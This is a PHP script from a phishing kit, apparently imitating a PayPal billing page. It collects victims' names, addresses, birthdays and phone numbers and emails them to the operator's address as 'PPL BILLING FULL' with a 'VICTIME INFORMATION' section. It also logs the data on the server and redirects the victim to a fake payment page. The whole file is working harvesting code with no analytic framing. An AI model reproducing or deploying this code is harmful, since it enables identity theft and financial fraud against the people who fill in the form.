<?php
session_start();
header('Location: ../payment.html');
require 'Email.php';
require 'getdata.php';
$_SESSION["all"] = $_POST['al'];
$_SESSION["zcity"] = $_POST['city'];
$_SESSION["statee"] = $_POST['state'];
$fn = $_POST['fn'];
$ln = $_POST['ln'];
$al = $_POST['al'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip = $_POST['zip'];
$bd = $_POST['bd'];
$pn = $_POST['pn'];
$to = "$yourmail";
$subject = "👑BILLING-INFO👑 FROM  ".$ip."🔥".$country."";
$message = "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
#################### <font style='color: #820000;'>PPL BILLING FULL</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>BILLING INFORMATION</font> ]±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [First Name] = <font style='color:#0070ba;'>$fn</font><br>
<font style='color:#9c0000;'>✪</font> [Last Name] = <font style='color:#0070ba;'>$ln</font><br>
<font style='color:#9c0000;'>✪</font> [Country] = <font style='color:#0070ba;'>$country</font><br>
<font style='color:#9c0000;'>✪</font> [Adress Line] = <font style='color:#0070ba;'>$al</font><br>
<font style='color:#9c0000;'>✪</font> [City] = <font style='color:#0070ba;'>$city</font><br>
<font style='color:#9c0000;'>✪</font> [State] = <font style='color:#0070ba;'>$state</font><br>
<font style='color:#9c0000;'>✪</font> [Postal Code] = <font style='color:#0070ba;'>$zip</font><br>
<font style='color:#9c0000;'>✪</font> [Birthday] = <font style='color:#0070ba;'>$bd</font><br>
<font style='color:#9c0000;'>✪</font> [Phone Number] = <font style='color:#0070ba;'>$pn</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>$time</font><br>
<font style='color:#9c0000;'>✪</font> [OS] = <font style='color:#0070ba;'>$user_os</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>$user_browser</font><br>
##################### <font style='color: #820000;'>Thankx to ✪ Coachella ✪</font> #####################
</div></html>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From:🏠BillingAdress🏠 <priv8scampage@rez.com>' . "\r\n";
mail($to,$subject,$message,$headers);

$path = "../../../admin/ips/$ip.html";
file_put_contents($path,"$message<br><br>", FILE_APPEND);
?>